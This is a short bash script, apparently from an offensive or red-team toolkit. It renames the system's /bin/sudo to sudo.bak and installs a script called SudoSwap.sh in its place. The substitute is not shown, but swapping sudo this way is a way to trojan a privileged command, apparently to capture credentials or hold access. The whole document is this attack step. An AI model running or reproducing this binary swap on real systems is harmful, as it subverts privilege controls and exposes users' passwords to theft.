#!/bin/bash
if [ -e "/bin/sudo" ]; then
   mv /bin/sudo /bin/sudo.bak
    cp Linux/BianarySwapping/SudoSwap.sh /bin/sudo
else
    echo "Bianary not present on system."
fi
